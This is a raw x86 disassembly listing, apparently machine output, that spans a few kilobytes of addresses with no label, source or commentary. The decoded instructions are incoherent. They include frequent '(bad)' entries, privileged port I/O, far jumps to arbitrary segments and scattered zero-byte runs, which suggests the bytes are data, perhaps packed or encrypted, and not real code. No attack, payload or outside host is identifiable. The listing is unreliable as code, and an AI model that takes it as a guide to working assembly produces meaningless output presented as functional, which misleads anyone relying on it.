  4292ec:	call   0x2b564d
  4292f1:	in     al,0xf5
  4292f3:	pop    ss
  4292f4:	xchg   ebp,eax
  4292f5:	cmp    DWORD PTR [ecx],edi
  4292f7:	iret   
  4292f8:	jne    0x42936d
  4292fa:	mov    ds:0x39f066ce,al
  4292ff:	xor    ecx,DWORD PTR [eax]
  429301:	data16 mov ch,0xe
  429304:	lea    esi,[ebp+0x390716d9]
  42930a:	mov    ch,0x3e
  42930c:	jmp    DWORD PTR [ecx+eax*2+0x1c]
  429310:	inc    eax
  429311:	sub    DWORD PTR [eax],edx
  429313:	fwait
  429314:	and    al,0xcb
  429316:	mov    bl,0xe
  429318:	add    BYTE PTR [ecx],dl
  42931a:	adc    edi,DWORD PTR [esi-0x30c7d700]
  429320:	js     0x429383
  429322:	dec    ecx
  429323:	fwait
  429324:	dec    esp
  429325:	aad    0x88
  429327:	aas    
  429328:	push   eax
  429329:	ins    BYTE PTR es:[edi],dx
  42932a:	cmp    DWORD PTR [ebx],esi
  42932c:	mov    esi,0x500eb4eb
  429331:	cmp    al,BYTE PTR [edx-0x17]
  429334:	(bad)  
  429335:	add    BYTE PTR [eax],al
  429337:	add    BYTE PTR [eax],al
  429339:	add    BYTE PTR [ebp+esi*8+0x68],dh
  42933d:	xor    edi,edx
  42933f:	mov    ebx,0x68bf444a
  429344:	adc    eax,0x2e80a43b
  429349:	xor    eax,DWORD PTR [eax-0xab36869]
  42934f:	test   BYTE PTR [ebx+0x5c869544],bl
  429355:	mov    edx,0x506f55
  42935a:	cmp    al,0x11
  42935c:	xor    edi,esp
  42935e:	nop
  42935f:	pushf  
  429360:	adc    BYTE PTR [eax],al
  429362:	test   al,0x1d
  429364:	and    edx,edi
  429366:	xchg   edi,eax
  429367:	sbb    eax,0xda250b50
  42936c:	xchg   ebx,eax
  42936d:	sar    ch,0x93
  429370:	(bad)  
  429371:	mov    edi,0x249412f6
  429376:	js     0x429315
  429378:	adc    BYTE PTR [eax],al
  42937a:	sbb    eax,0x93f82f16
  42937f:	cdq    
  429380:	adc    BYTE PTR [eax+0x5f],dl
  429383:	xchg   DWORD PTR [edi+ecx*1+0xd9599d0],edx
  42938a:	mov    eax,0x91ffcefd
  42938f:	dec    eax
  429390:	(bad)  
  429391:	daa    
  429392:	ret    
  429393:	aad    0x12
  429395:	sti    
  429396:	popf   
  429397:	imul   esp,ebp,0x6fa903f
  42939d:	outs   dx,DWORD PTR ds:[esi]
  42939e:	add    BYTE PTR [eax],al
  4293a0:	add    BYTE PTR [eax],al
  4293a2:	add    ah,cl
  4293a4:	cdq    
  4293a5:	xchg   ebp,eax
  4293a6:	clc    
  4293a7:	pop    ds
  4293a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4293a9:	jmp    0x57ecab13
  4293ae:	adc    eax,0xffd06ca4
  4293b3:	out    dx,eax
  4293b4:	adc    eax,ecx
  4293b6:	cli    
  4293b7:	(bad)  
  4293b8:	out    dx,al
  4293b9:	data16 and al,0x88
  4293bc:	mov    al,ds:0x38f80010
  4293c1:	sar    ecx,1
  4293c3:	out    0x16,eax
  4293c5:	addr16 and al,0xd8
  4293c8:	pushf  
  4293c9:	adc    BYTE PTR [eax],al
  4293cb:	call   0xd03c64e4
  4293d0:	push   ds
  4293d1:	addr16 and al,0xe2
  4293d4:	fwait
  4293d5:	adc    BYTE PTR [eax],al
  4293d7:	test   al,0x90
  4293d9:	and    eax,DWORD PTR [eax]
  4293db:	nop
  4293dc:	mov    dl,0x7a
  4293de:	inc    esp
  4293df:	sub    bl,ch
  4293e1:	mov    ds:0xc1d65478,al
  4293e6:	mov    ah,0x4f
  4293e8:	cmp    eax,0xb4ba2072
  4293ed:	cmc    
  4293ee:	add    esp,eax
  4293f0:	jecxz  0x42937a
  4293f2:	dec    edx
  4293f3:	bound  esi,QWORD PTR ds:0x18d3ca36
  4293f9:	lahf   
  4293fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4293fb:	ror    eax,cl
  4293fd:	dec    ecx
  4293fe:	jmp    DWORD PTR [esi-0x48f2b48b]
  429404:	jns    0x429462
  429406:	jge    0x429408
  429408:	add    BYTE PTR [eax],al
  42940a:	add    BYTE PTR [eax],al
  42940c:	int3   
  42940d:	idiv   ch
  42940f:	js     0x42940d
  429411:	aad    0x5d
  429413:	add    edx,DWORD PTR [eax-0x6f9f714e]
  429419:	mov    dl,0xf5
  42941b:	pop    ebx
  42941c:	repz push ebp
  42941f:	add    eax,DWORD PTR ds:0xc00bd9f6
  429425:	cmp    eax,0xb2141f62
  42942a:	cmc    
  42942b:	add    ecx,DWORD PTR ds:0x88efd23e
  429431:	mov    dl,0xf5
  429433:	pop    ebx
  429434:	jecxz  0x429497
  429436:	ins    BYTE PTR es:[edi],dx
  429437:	dec    edx
  429438:	or     eax,0xd070f572
  42943d:	xor    eax,0xc38dd0b6
  429442:	xor    eax,0x123618e1
  429447:	hlt    
  429448:	cwde   
  429449:	mov    dl,0xf5
  42944b:	js     0x429461
  42944d:	(bad)  
  42944e:	in     eax,0xfc
  429450:	xlat   BYTE PTR ds:[ebx]
  429451:	mov    es,WORD PTR [esi-0xa4d6f25]
  429457:	or     ebx,0xffffffa4
  42945a:	push   cs
  42945b:	mov    cl,0xc6
  42945d:	into   
  42945e:	push   cs
  42945f:	bound  esp,QWORD PTR [eax-0x6c56fca2]
  429465:	cmp    eax,0xb493c593
  42946a:	push   cs
  42946b:	jmp    0xc5d5d253
  429470:	add    BYTE PTR [eax],al
  429472:	add    BYTE PTR [eax],al
  429474:	add    BYTE PTR [edi+0x43e90eb3],bl
  42947a:	mov    ebp,eax
  42947c:	ins    BYTE PTR es:[edi],dx
  42947d:	pop    es
  42947e:	xlat   BYTE PTR ds:[ebx]
  42947f:	fsubp  st(3),st
  429481:	xchg   ebx,eax
  429482:	mov    dl,0x3e
  429484:	pop    esp
  429485:	not    esi
  429487:	jmp    0xa2de:0x3eb293ea
  42948e:	aas    
  42948f:	or     DWORD PTR ds:0xe90eb304,0xa
  429496:	jne    0x4294a7
  429498:	jmp    0x2d382f30
  42949d:	mov    WORD PTR [edx-0x7d8f9267],?
  4294a3:	adc    ecx,ebp
  4294a5:	xchg   ebx,eax
  4294a6:	loop   0x429441
  4294a8:	ins    DWORD PTR es:[edi],dx
  4294a9:	jo     0x429461
  4294ab:	adc    al,0xe9
  4294ad:	xchg   ebx,eax
  4294ae:	loop   0x429449
  4294b0:	ins    DWORD PTR es:[edi],dx
  4294b1:	jo     0x42943d
  4294b3:	adc    ecx,ebp
  4294b5:	xchg   ebx,eax
  4294b6:	loop   0x429451
  4294b8:	ins    DWORD PTR es:[edi],dx
  4294b9:	mov    al,0xbe
  4294bb:	adc    al,0xe9
  4294bd:	xchg   ebx,eax
  4294be:	loop   0x429459
  4294c0:	ins    DWORD PTR es:[edi],dx
  4294c1:	mov    al,0x72
  4294c3:	psubsw mm2,QWORD PTR [ebx-0x4f92661e]
  4294ca:	ficom  WORD PTR [edi]
  4294cc:	jmp    0xeda5af64
  4294d1:	xchg   ebx,eax
  4294d2:	mov    dl,0x3e
  4294d4:	inc    ecx
  4294d5:	pop    edx
  4294d6:	loop   0x4294c4
  4294d8:	add    BYTE PTR [eax],al
  4294da:	add    BYTE PTR [eax],al
  4294dc:	add    BYTE PTR [eax],al
  4294de:	push   esi
  4294df:	aaa    
  4294e0:	rcr    DWORD PTR [esp+ebp*1],cl
  4294e3:	imul   BYTE PTR [eax+0xc]
  4294e6:	xor    al,0xa
  4294e8:	xor    ebx,DWORD PTR [eax]
  4294ea:	mov    dl,0xb1
  4294ec:	push   cs
  4294ed:	call   0x51cda1
  4294f2:	cmp    dh,BYTE PTR [ebp-0x4e128cc6]
  4294f8:	out    0x75,eax
  4294fa:	scas   al,BYTE PTR es:[edi]
  4294fb:	inc    esi
  4294fc:	jmp    0x2cc2a616
  429501:	add    al,dl
  429503:	call   0x4ab9515
  429508:	xchg   ebx,eax
  429509:	and    al,0x69
  42950b:	mov    al,0xe
  42950d:	add    cl,ah
  42950f:	cdq    
  429510:	sub    al,0x49
  429512:	mov    esp,0xf95d48fc
  429517:	scas   eax,DWORD PTR es:[edi]
  429518:	inc    ebx
  429519:	sub    DWORD PTR ds:0x39001809,0x79ec6bf6
  429523:	inc    edi
  429524:	inc    ebx
  429525:	push   esi
  429526:	sahf   
  429527:	outs   dx,BYTE PTR ds:[esi]
  429528:	sbb    BYTE PTR [ebx+0x4c95b669],cl
  42952e:	pop    ebp
  42952f:	sar    DWORD PTR [ebx],1
  429531:	inc    DWORD PTR [esi]
  429533:	pushf  
  429534:	je     0x429547
  429536:	imul   esi,DWORD PTR [esi-0x52b2bb6b],0xd06c091
  429540:	add    DWORD PTR [ecx],0x0
  429546:	add    cl,bh
  429548:	mov    al,0x76
  42954a:	sbb    BYTE PTR [edx+0x71],dh
  42954d:	in     al,dx
  42954e:	dec    edi
  42954f:	pushfw 
  429551:	mov    WORD PTR [edx],ss
  429553:	cmp    DWORD PTR [ecx-0x5572bb31],esi
  429559:	or     eax,0x109b9000
  42955e:	mov    DWORD PTR [edi+esi*4+0x2],edx
  429562:	mov    DWORD PTR [edi+edi*4-0x2],ecx
  429566:	mov    BYTE PTR [edi+esi*4+0x1a],al
  42956a:	test   eax,edx
  42956c:	xchg   ebx,eax
  42956d:	ins    BYTE PTR es:[edi],dx
  42956e:	ss xchg ecx,eax
  429570:	fwait
  429571:	adc    BYTE PTR [ebx+0x1d],dl
  429574:	inc    edi
  429575:	or     al,0x30
  429577:	inc    ecx
  429578:	push   ds
  429579:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42957a:	and    esp,DWORD PTR [eax+0x4a]
  42957d:	push   edi
  42957e:	ror    BYTE PTR ds:0xb584e6db,1
  429584:	call   0x679f:0x24df0010
  42958b:	rcl    BYTE PTR [eax+edx*8],1
  42958e:	push   DWORD PTR [esi+0x67]
  429591:	adc    BYTE PTR [eax],0xd0
  429594:	cdq    
  429595:	imul   ebx,eax,0x83e4710d
  42959b:	xchg   edi,eax
  42959c:	call   0xd7de:0x7cc30010
  4295a3:	mov    al,ds:0x388712d9
  4295a8:	pop    ss
  4295a9:	inc    esi
  4295aa:	or     eax,DWORD PTR [eax]
  4295ac:	add    BYTE PTR [eax],al
  4295ae:	add    BYTE PTR [eax],al
  4295b0:	adc    al,0x75
  4295b2:	adc    eax,DWORD PTR [eax]
  4295b4:	nop
  4295b5:	icebp  
  4295b6:	sar    BYTE PTR [edi-0x70],cl
  4295b9:	cdq    
  4295ba:	mov    ebp,0xc897ba52
  4295bf:	call   FWORD PTR [esi+0x17531099]
  4295c5:	xchg   DWORD PTR [edx*1+0x446b9950],eax
  4295cc:	lods   al,BYTE PTR ds:[esi]
  4295cd:	gs pop eax
  4295d0:	test   BYTE PTR [eax+0x67],bh
  4295d3:	dec    esp
  4295d4:	lods   al,BYTE PTR ds:[esi]
  4295d5:	pop    ebp
  4295d6:	mov    ds:0xeab2ef4f,eax
  4295db:	fwait
  4295dc:	jl     0x4295d0
  4295de:	cmc    
  4295df:	adc    al,0x6
  4295e2:	cmc    
  4295e3:	js     0x429631
  4295e5:	(bad)  
  4295e6:	jmp    0x29e8609e
  4295eb:	lock xchg DWORD PTR [edx-0x49babb8e],esi
  4295f2:	outs   dx,BYTE PTR ds:[esi]
  4295f3:	enter  0xa673,0x70
  4295f7:	adc    DWORD PTR [eax+0x2e03b5a2],esi
  4295fd:	mov    edx,0x39c246a8
  429602:	mov    edx,0xf018801f
  429607:	mov    dl,0x8a
  429609:	fs pop edi
  42960b:	shl    BYTE PTR [ebx+0x44685aa],0xd7
  429612:	leave  
  429613:	mov    dl,0x0
  429615:	add    BYTE PTR [eax],al
  429617:	add    BYTE PTR [eax],al
  429619:	jp     0x4295c0
  42961b:	sbb    esp,esi
  42961d:	scas   eax,DWORD PTR es:[edi]
  42961e:	mov    dl,0x60
  429620:	push   ebx
  429621:	or     eax,0xc1c64284
  429626:	in     eax,0xc4
  429628:	lock inc ebx
  42962a:	mov    ds:0xf6190435,al
  42962f:	sbb    DWORD PTR [ecx*1-0x4820dd8e],esp
  429636:	shl    ch,cl
  429638:	aaa    
  429639:	shl    bl,1
  42963b:	add    al,0xb3
  42963d:	sub    al,BYTE PTR [esi]
  42963f:	ficomp DWORD PTR [ebx]
  429641:	sub    eax,DWORD PTR [esi]
  429643:	rcr    BYTE PTR [edi],cl
  429645:	ret    
  429646:	jecxz  0x429672
  429648:	inc    edi
  429649:	jge    0x4295e1
  42964b:	out    0xc3,al
  42964d:	(bad)  
  42964f:	mov    dh,0xcf
  429651:	retf   0x237
  429654:	and    BYTE PTR [ebp+esi*1-0x2f3864f1],ah
  42965b:	xchg   edi,eax
  42965c:	sbb    eax,0xb537deb0
  429661:	xchg   edx,esi
  429663:	js     0x42964e
  429665:	sub    edi,DWORD PTR [eax-0x9a5deaa]
  42966b:	xor    bl,BYTE PTR [ecx]
  42966d:	stos   DWORD PTR es:[edi],eax
  42966e:	div    BYTE PTR [edx]
  429670:	lods   eax,DWORD PTR ds:[esi]
  429671:	jmp    0xc6dde400
  429676:	repnz rcr DWORD PTR [ecx-0x2b141a04],cl
  42967d:	add    BYTE PTR [eax],al
  42967f:	add    BYTE PTR [eax],al
  429681:	add    BYTE PTR [edi],cl
  429683:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429684:	dec    esi
  429685:	jmp    0xc5a61e66
  42968a:	jae    0x4296c9
  42968c:	pop    ebx
  42968d:	int    0x7f
  42968f:	loopne 0x429687
  429691:	fcom   DWORD PTR [ecx]
  429693:	mov    gs,esp
  429695:	jb     0x429672
  429697:	lea    esp,[ebx-0x3b]
  42969a:	mov    bl,0xdf
  42969c:	jmp    0x42967a
  42969e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42969f:	mov    ds:0x8d3de94e,al
  4296a4:	add    bh,BYTE PTR [ecx+0x340eca5c]
  4296aa:	aad    0x9f
  4296ac:	(bad)  
  4296ae:	push   ebx
  4296af:	mov    al,BYTE PTR [ecx-0x32]
  4296b2:	aas    
  4296b3:	jle    0x4296b4
  4296b5:	sub    BYTE PTR [ecx+esi*1-0x6e8ffaad],cl
  4296bc:	push   DWORD PTR [ebp-0x51cd29a0]
  4296c2:	aas    
  4296c3:	dec    esi
  4296c4:	add    DWORD PTR [ecx],ebp
  4296c6:	mov    WORD PTR [ecx],?
  4296c8:	aam    0x70
  4296ca:	push   eax
  4296cb:	(bad)  
  4296cc:	xor    ch,BYTE PTR [esp+ecx*8-0x2]
  4296d0:	add    DWORD PTR cs:[ecx+esi*1+0x45f9004f],ebp
  4296d8:	jmp    0x2cc6dff2
  4296dd:	add    BYTE PTR [esi+ebp*8+0x62],ah
  4296e1:	push   es
  4296e2:	jle    0x429746
  4296e4:	xor    BYTE PTR [eax],ch
  4296e6:	add    BYTE PTR [eax],al
  4296e8:	add    BYTE PTR [eax],al
  4296ea:	add    BYTE PTR [esi-0x42],ch
  4296ed:	out    0x74,eax
  4296ef:	xchg   ebp,eax
  4296f0:	shl    bh,cl
  4296f2:	adc    eax,0x2c84fd
  4296f7:	xor    al,bh
  4296f9:	inc    edi
  4296fa:	pop    esi
  4296fb:	in     al,dx
  4296fc:	pop    edx
  4296fd:	ins    DWORD PTR es:[edi],dx
  4296fe:	(bad)  
  4296ff:	jmp    0x2842a9f7
  429704:	jmp    0x555b:0xb5b9065e
  42970b:	out    0x56,eax
  42970d:	fwait
  42970e:	mov    ebp,ss
  429710:	xor    eax,0xaa9000f
  429715:	std    
  429716:	call   0x2ad472
  42971b:	add    dh,BYTE PTR [ebx]
  42971d:	xor    ebp,DWORD PTR [edx+0x6b]
  429720:	mov    ch,0xe
  429722:	mov    edi,DWORD PTR [ebp+0x790692d2]
  429728:	mov    ch,0x21
  42972a:	xor    edx,DWORD PTR [eax]
  42972c:	test   cl,ch
  42972e:	mov    esp,DWORD PTR [esi]
  429730:	or     bl,cl
  429732:	mov    DWORD PTR [ebp-0x2b17f92e],esp
  429738:	into   
  429739:	push   cs
  42973a:	add    dl,al
  42973c:	in     eax,dx
  42973d:	xchg   ecx,eax
  42973e:	in     eax,dx
  42973f:	or     DWORD PTR cs:[edx+0x1],esp
  429743:	sub    DWORD PTR [ebp+0x1cc553f],esi
  429749:	xor    ecx,DWORD PTR [eax-0x17f14ac7]
  42974f:	add    BYTE PTR [eax],al
  429751:	add    BYTE PTR [eax],al
  429753:	add    BYTE PTR [ebp+0x3a],dl
  429756:	call   0x6451285a
  42975b:	and    al,0xc2
  42975d:	popf   
  42975e:	adc    BYTE PTR [eax],al
  429760:	clc    
  429761:	push   ebx
  429762:	and    eax,0x374c9000
  429767:	test   eax,edx
  429769:	and    BYTE PTR [edx-0x5c197b9b],0x23
  429770:	mov    al,0x4a
  429772:	mov    al,ds:0x14af148c
  429777:	(bad)  
  429778:	xlat   BYTE PTR ds:[ebx]
  429779:	call   0xf7fc:0xf8634ea0
  429780:	mov    ds:0xd085105b,al
  429785:	dec    eax
  429786:	(bad)  
  429787:	popa   
  429788:	jns    0x4297a9
  42978a:	lods   al,BYTE PTR ds:[esi]
  42978b:	adc    eax,0xf88f6724
  429790:	jl     0x4297e0
  429792:	or     ch,BYTE PTR [edi]
  429794:	leave  
  429795:	xor    BYTE PTR [ecx+0x4c],ch
  429798:	dec    esp
  429799:	jg     0x429800
  42979b:	inc    esp
  42979c:	mov    ah,0x95
  42979e:	mov    al,ds:0xac203cb5
  4297a3:	dec    DWORD PTR [esi+edx*1]
  4297a6:	or     al,0x74
  4297a8:	xchg   edx,eax
  4297a9:	cdq    
  4297aa:	adc    al,ch
  4297ac:	push   ds
  4297ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4297ae:	push   ecx
  4297af:	sti    
  4297b0:	or     eax,0x5095005a
  4297b5:	push   cs
  4297b6:	push   ebx
  4297b7:	jne    0x4297b9
  4297b9:	add    BYTE PTR [eax],al
  4297bb:	add    BYTE PTR [eax],al
  4297bd:	mov    ch,BYTE PTR [edx+edx*2-0x8f1e69e]
  4297c4:	outs   dx,DWORD PTR ds:[esi]
  4297c5:	xchg   edx,eax
  4297c6:	cdq    
  4297c7:	adc    BYTE PTR [ebp-0x25d51ec],cl
  4297cd:	aaa    
  4297ce:	call   0x4004:0x1585fac0
  4297d5:	nop
  4297d6:	mov    dl,0x62
  4297d8:	fdiv   DWORD PTR [ebx-0x12]
  4297db:	call   edi
  4297dd:	mov    eax,0xfcedf9a
  4297e2:	mov    cl,cl
  4297e4:	inc    ebx
  4297e5:	push   eax
  4297e6:	cmp    dh,BYTE PTR [edx]
  4297e8:	call   0xe874d17b
  4297ed:	mov    ds:0x87e7ea87,eax
  4297f2:	loop   0x42983e
  4297f4:	enter  0xf6b3,0xa5
  4297f8:	nop
  4297f9:	push   esp
  4297fa:	into   
  4297fb:	shr    DWORD PTR [ebp-0xb21d7d],1
  429801:	pop    esp
  429802:	mov    BYTE PTR [ebp-0x79],bl
  429805:	int3   
  429806:	sahf   
  429807:	js     0x429845
  429809:	mov    ebx,0x906d71b7
  42980e:	mov    dl,0xf5
  429810:	nop
  429811:	push   esp
  429812:	into   
  429813:	jge    0x4297e8
  429815:	adc    al,0x1f
  429817:	fidiv  DWORD PTR [edi-0x6f097863]
  42981d:	add    al,0xcf
  42981f:	add    DWORD PTR [edi],0x0
  429825:	add    BYTE PTR [eax+0x55200db2],dl
  42982b:	mov    BYTE PTR ds:0x71b75089,dl
  429831:	lea    edx,[eax-0x8290a4e]
  429837:	xor    dh,dh
  429839:	add    edx,DWORD PTR [eax-0x312908e4]
  42983f:	sbb    dh,dh
  429841:	add    edx,DWORD PTR [eax+0x74877372]
  429847:	and    dh,dl
  429849:	add    edx,DWORD PTR [eax-0x2be72b1e]
  42984f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429850:	xor    eax,0xf820f04
  429855:	push   0xffffffd1
  429857:	mov    esp,DWORD PTR [edx+0x8]
  42985a:	rcr    DWORD PTR [ebp-0x78ac0482],cl
  429860:	xchg   ecx,eax
  429861:	mov    eax,ds:0x6248fe43
  429866:	xlat   BYTE PTR ds:[ebx]
  429867:	rol    BYTE PTR [edx],cl
  429869:	sub    DWORD PTR ds:0x90dd32ee,edx
  42986f:	call   0xf290:0xbb93e910
  429876:	push   edx
  429877:	mov    ebp,esp
  429879:	or     bh,0xf7
  42987c:	cdq    
  42987d:	lods   eax,DWORD PTR ds:[esi]
  42987e:	neg    DWORD PTR [esi-0x1f4749c2]
  429884:	jmp    0x429882
  429886:	retf   
  429887:	mov    ah,0x4e
  429889:	jmp    0x42988e
  42988e:	add    BYTE PTR [eax],bl
  429890:	jb     0x4298f5
  429892:	repnz dec ecx
  429894:	out    dx,al
  429895:	xor    bl,dl
  429897:	mov    ecx,cs
  429899:	push   0xd
  42989b:	mov    dh,bh
  42989d:	adc    ah,BYTE PTR [ecx-0x39]
  4298a0:	sar    bh,cl
  4298a2:	mov    esi,0xf88e9d52
  4298a7:	rol    DWORD PTR [esi+0x12a81642],cl
  4298ad:	add    DWORD PTR [ecx-0x32acd36d],ebp
  4298b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4298b4:	cs iret 
  4298b6:	je     0x42983f
  4298b8:	aaa    
  4298b9:	fwait
  4298ba:	int    0x2b
  4298bc:	mov    dl,0xe
  4298be:	jmp    0xe9c9377e
  4298c3:	xchg   ebx,eax
  4298c4:	sub    eax,0xa8f6d1da
  4298c9:	push   cs
  4298ca:	jmp    0xfa7587ec
  4298cf:	je     0x42987f
  4298d1:	pop    ds
  4298d2:	add    dl,dh
  4298d4:	xor    al,0xac
  4298d6:	mov    edx,0xeb247
  4298db:	mov    ah,0x22
  4298dd:	xor    eax,DWORD PTR [eax-0x77f14dc7]
  4298e3:	nop
  4298e4:	jno    0x429938
  4298e6:	jne    0x4298db
  4298e8:	xchg   ebx,eax
  4298e9:	inc    esi
  4298ea:	pop    ebp
  4298eb:	ret    0xd331
  4298ee:	jo     0x4298df
  4298f0:	mov    cl,0xe
  4298f2:	ret    0x0
  4298f5:	add    BYTE PTR [eax],al
  4298f7:	add    ch,ch
  4298f9:	mov    cl,0x8d
  4298fb:	in     al,dx
  4298fc:	and    eax,0x8a000eb7
  429901:	pop    ebp
  429902:	ds push edi
  429904:	inc    esp
  429905:	and    dh,BYTE PTR [ebx]
  429907:	mov    cl,ch
  429909:	mov    cl,0xe
  42990b:	mov    DWORD PTR ds:0xf3e8088e,ebx
  429911:	or     ebp,eax
  429913:	jmp    DWORD PTR [edx+eiz*1+0x33]
  429917:	cmp    ch,BYTE PTR [ebx-0x4117f14f]
  42991d:	cmc    
  42991e:	push   cs
  42991f:	add    BYTE PTR [edx-0x1e3f6e1a],ch
  429925:	arpl   WORD PTR [edx+0x14],si
  429928:	and    al,0x62
  42992a:	xor    BYTE PTR [eax+ebx*8],bh
  42992d:	popa   
  42992e:	fwait
  42992f:	test   BYTE PTR [ebp+0x7b],bl
  429932:	jmp    0x9653:0x5d6179ff
  429939:	popf   
  42993a:	out    0x12,al
  42993c:	sub    DWORD PTR [ecx+0x7fe7c091],esi
  429942:	outs   dx,BYTE PTR ds:[esi]
  429943:	cmp    DWORD PTR ds:0x65741e6d,edx
  429949:	cs out 0x14,eax
  42994c:	mov    ah,0x98
  42994e:	cmp    eax,0x97f590c9
  429953:	dec    esp
  429954:	int3   
  429955:	mov    ds:0xb374449b,eax
  42995a:	ret    0xb5
  42995d:	add    BYTE PTR [eax],al
  42995f:	add    BYTE PTR [eax],al
  429961:	cld    
  429962:	hlt    
  429963:	(bad)  
  429964:	call   FWORD PTR [edi+ecx*1]
  429967:	hlt    
  429968:	jnp    0x4298fc
  42996a:	fwait
  42996b:	adc    al,ch
  42996d:	sub    al,BYTE PTR [eax+0x4e]
  429970:	sti    
  429971:	or     eax,0xd094ff5b
  429976:	push   ss
  429977:	push   eax
  429978:	jne    0x429914
  42997a:	push   0x17096250
  42997f:	hlt    
  429980:	ja     0x429914
  429982:	fwait
  429983:	adc    BYTE PTR [ebp-0x25788ec],cl
  429989:	out    0x9a,eax
  42998b:	sar    dl,0x85
  42998e:	dec    edi
  42998f:	add    eax,DWORD PTR [eax-0x70]
  429992:	add    BYTE PTR [esp+0x42],ah
  429996:	cdq    
  429997:	adc    BYTE PTR [eax],al
  429999:	cmp    bh,BYTE PTR [esi]
  42999b:	popf   
  42999c:	push   esp
  42999d:	je     0x42993e
  42999f:	(bad)  
  4299a0:	out    0x26,eax
  4299a2:	inc    edx
  4299a3:	adc    BYTE PTR [eax],al
  4299a5:	adc    ebp,eax
  4299a7:	loop   0x429941
  4299a9:	adc    esp,0x77548cc5
  4299af:	cld    
  4299b0:	dec    edi
  4299b1:	add    eax,0xfa67f44f
  4299b6:	test   eax,eax
  4299b8:	out    0x29,eax
  4299ba:	push   ecx
  4299bb:	dec    esi
  4299bc:	sti    
  4299bd:	adc    edx,esi
  4299bf:	(bad)  
  4299c0:	jle    0x429a3a
  4299c2:	test   DWORD PTR [esp+eax*4],ebx
  4299c5:	add    BYTE PTR [eax],al
  4299c7:	add    BYTE PTR [eax],al
  4299c9:	add    BYTE PTR ds:0x1500109b,bl
  4299cf:	dec    esi
  4299d0:	hlt    
  4299d1:	pop    edi
  4299d2:	shl    BYTE PTR [edx+0x6ac9862],0xf8
  4299d9:	add    edx,DWORD PTR [eax+0x13e87235]
  4299df:	scas   eax,DWORD PTR es:[edi]
  4299e0:	cmc    
  4299e1:	add    ebp,DWORD PTR [eax]
  4299e3:	or     DWORD PTR [ecx-0x49d1c4c2],esp
  4299e9:	unpcklps xmm2,XMMWORD PTR [esi]
  4299ec:	test   DWORD PTR [ebx],0xe8723590
  4299f2:	pop    ss
  4299f3:	lods   eax,DWORD PTR ds:[esi]
  4299f4:	cmc    
  4299f5:	add    eax,eax
  4299f7:	xor    eax,0xaf13e872
  4299fc:	cmc    
  4299fd:	add    esp,DWORD PTR [eax-0x7d]
  429a00:	jecxz  0x4299f1
  429a02:	(bad)  
  429a03:	repnz cmc 
  429a05:	mov    ch,al
  429a07:	aaa    
  429a08:	xchg   ecx,eax
  429a09:	sub    ebp,0xffffff83
  429a0c:	cmc    
  429a0d:	xchg   DWORD PTR [ecx+esi*4-0xb],edx
  429a11:	add    ebx,DWORD PTR [edi-0xa]
  429a14:	sbb    DWORD PTR [ebx+ebx*8],ebx
  429a17:	xor    eax,0xad03e872
  429a1c:	cmc    
  429a1d:	add    esp,DWORD PTR [eax+0x35]
  429a20:	(bad)  
  429a21:	call   0x4384a61
  429a26:	add    eax,0x94881237
  429a2b:	mov    dl,0xf5
  429a2d:	sub    eax,DWORD PTR [eax]
  429a2f:	add    BYTE PTR [eax],al
  429a31:	add    BYTE PTR [eax],al
  429a33:	jnp    0x429aac
  429a35:	cmp    al,0x3f
  429a37:	adc    eax,0xba87e573
  429a3c:	mov    dl,0xf5
  429a3e:	add    edi,eax
  429a40:	xor    dh,dh
  429a42:	add    edx,DWORD PTR [eax+0x7ea9f918]
  429a48:	or     esi,esi
  429a4a:	add    edx,DWORD PTR [eax-0x4b7784ce]
  429a50:	and    cl,BYTE PTR [edi]
  429a52:	in     eax,dx
  429a53:	xchg   ebx,eax
  429a54:	mov    dl,0x3e
  429a56:	pop    esp
  429a57:	inc    eax
  429a58:	iret   
  429a59:	cmp    dl,cl
  429a5b:	cmc    
  429a5c:	xor    ecx,DWORD PTR [edi]
  429a5e:	jmp    0x6d5f0c7a
  429a63:	mov    esi,0x20e90eb2
  429a68:	out    dx,al
  429a69:	xor    cl,BYTE PTR [ecx]
  429a6b:	pop    esp
  429a6c:	ss pop ebx
  429a6e:	add    eax,0xd4b3a70
  429a73:	mov    ebx,DWORD PTR [edx-0x4d6ca40b]
  429a79:	xchg   edx,eax
  429a7a:	test   eax,0xe9d72e86
  429a7f:	xchg   ebx,eax
  429a80:	mov    dl,0x97
  429a82:	sbb    eax,0xa797a2f8
  429a87:	mov    ch,dh
  429a89:	xor    cl,ch
  429a8b:	xchg   BYTE PTR [esi],ch
  429a8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429a8e:	jmp    0x15684d26
  429a93:	clc    
  429a94:	into   
  429a95:	sbb    esp,DWORD PTR [esi+0x0]
  429a98:	add    BYTE PTR [eax],al
  429a9a:	add    BYTE PTR [eax],al
  429a9c:	ins    DWORD PTR es:[edi],dx
  429a9d:	mov    dl,0xe
  429a9f:	jmp    0x5fd051c5
  429aa4:	xchg   ebx,eax
  429aa5:	mov    dl,0xae
  429aa7:	jmp    0xe9f1ca42
  429aac:	xchg   ebx,eax
  429aad:	mov    dl,0x99
  429aaf:	mov    bh,0x91
  429ab1:	sub    eax,0x8adbb5d6
  429ab6:	(bad)  
  429ab7:	aad    0x93
  429ab9:	mov    dl,0x97
  429abb:	adc    DWORD PTR [eax],ecx
  429abd:	pop    ebx
  429abe:	arpl   dx,sp
  429ac0:	or     BYTE PTR [eax-0x1ac6139a],al
  429ac6:	jmp    0x429ac4
  429ac8:	daa    
  429ac9:	mov    cl,0x4e
  429acb:	jmp    0x12f05e2
  429ad0:	mov    ds:0xfc5340ac,al
  429ad5:	jno    0x429b07
  429ad7:	and    BYTE PTR [ecx+0x69009bad],dl
  429add:	jge    0x429aad
  429adf:	jne    0x429aa5
  429ae1:	push   0x8abd8d5d
  429ae6:	pushf  
  429ae7:	add    BYTE PTR [ecx],bh
  429ae9:	mov    dh,0xf6
  429aeb:	mov    ebp,0x8be7c026
  429af0:	mov    cl,BYTE PTR gs:[eax]
  429af3:	mov    edx,DWORD PTR [edx+0x2e]
  429af6:	pop    ds
  429af7:	(bad)  
